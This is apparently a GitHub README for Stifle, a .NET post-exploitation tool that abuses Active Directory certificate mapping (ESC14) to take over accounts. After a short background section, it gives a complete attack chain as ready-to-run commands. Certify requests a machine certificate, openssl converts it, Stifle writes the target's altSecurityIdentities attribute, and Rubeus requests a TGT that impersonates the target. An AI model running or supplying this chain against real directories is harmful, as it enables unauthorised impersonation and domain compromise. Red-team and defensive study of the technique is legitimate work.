# Description
Nearly a year ago, Jonas Knudsen ([@Jonas_B_K](https://x.com/Jonas_B_K)) over at SpecterOps published a blog titled “ADCS ESC14 Abuse Technique”, covering a previously known technique for leveraging Active Directory Certificate Services (ADCS) for multiple types of account takeover via explicit certificate mapping. He published a collection of PowerShell tooling used for generating and writing the `altSecurityIdentities` attribute as part of the primary variation of the abuse technique. Since this technique could be seen as the third main method of account takeover when holding a write primitive over an object (along with RBCD and Shadow Credentials), I thought it needed its own .NET tooling since I noticed there hasn't been a single release for the past year. 

Introducing Stifle, an extremely simple .NET post-exploitation utility that uses a passed certificate to set explicit certificate mapping on a target object, allowing authentication as the target object using the already held certificate mapped. 

```
   _____ _   _  __ _
  / ____| | (_)/ _| |
 | (___ | |_ _| |_| | ___
  \___ \| __| |  _| |/ _ \
  ____) | |_| | | | |  __/
 |_____/ \__|_|_| |_|\___|

 [*] Exploit explicit certificate mapping in Active Directory

 [*] Add an explicit certificate mapping on a target object by writing the required altSecurityIdentities value using a certificate and the certificate password:
        Stifle.exe add /object:target /certificate:MIIMrQI... /password:P@ssw0rd

 [*] Clear the altSecurityIdentities attribute, removing the explicit certificate mapping:
        Stifle.exe clear /object:target
```

# Use
First request a certificate using Certify that the target object will be mapped to (Note the certificate requested must be a machine account certificate):
```
Certify.exe request /ca:lab.lan\lab-dc01-ca /template:Machine /machine
```
![image](https://github.com/user-attachments/assets/6472d40d-333e-47a9-9f34-19380eec2463)

Then copy the certificate information into a `.pem` file and use the openssl binary on a unix-based system to convert to base64 `.pfx` format:
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export | base64 -w 0
```

Next copy the exported certificate and exported certificate password into Stifle, which will generate a certificate mapping string and write it to the target objects `altSecurityIdentities` attribute:
```
Stifle.exe add /object:target /certificate:MIIMrQI... /password:P@ssw0rd
```
![image](https://github.com/user-attachments/assets/bfa06572-ac53-400f-8795-4542b89a41f8)


Finally request a TGT using PKINIT authentication, effectively impersonating the target user with Rubeus:
```
Rubeus.exe asktgt /user:target /certificate:MIIMrQI... /password:P@ssw0rd
```
![image](https://github.com/user-attachments/assets/9e7045cf-ef52-4fd4-a380-592f28080a15)


